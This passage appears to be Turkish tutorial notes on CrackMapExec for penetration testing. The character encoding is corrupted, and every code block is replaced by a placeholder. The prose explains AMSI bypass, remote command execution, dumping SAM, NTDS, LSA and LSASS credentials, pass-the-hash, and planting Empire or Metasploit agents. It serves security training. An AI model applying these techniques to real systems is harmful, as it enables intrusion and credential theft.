BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

